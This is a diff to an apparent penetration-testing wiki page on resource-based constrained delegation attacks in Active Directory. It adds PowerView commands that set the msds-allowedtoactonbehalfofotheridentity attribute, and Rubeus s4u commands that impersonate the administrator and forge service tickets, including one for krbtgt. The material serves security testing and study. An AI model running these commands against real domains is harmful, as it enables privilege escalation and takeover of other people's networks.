@@ -54,12 +54,31 @@ Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview
 
 ### Configuring R**esource-based Constrained Delegation**
 
+**Using activedirectory PowerShell module**
+
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$ #Assing delegation privileges
-Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it work
+Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
 
 ![](../../.gitbook/assets/b2.png)
+
+#### Using powerview
+
+```bash
+$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+#Check that it worked
+Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
 
 ### Performing a complete S4U attack
 
@@ -73,7 +92,13 @@ This will print the RC4 and AES hashes for that account.
 Now, the attack can be performed:
 
 ```bash
-rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
+rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
+```
+
+You can generate more tickets just asking once using the `/altservice` param of Rubeus:
+
+```bash
+rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
 {% hint style="danger" %}
@@ -81,12 +106,6 @@ Note that users has an attribute called "**Cannot be delegated**". If a user has
 {% endhint %}
 
 ![](../../.gitbook/assets/b3.png)
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
-```bash
-rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
-```
 
 ### Accessing
 
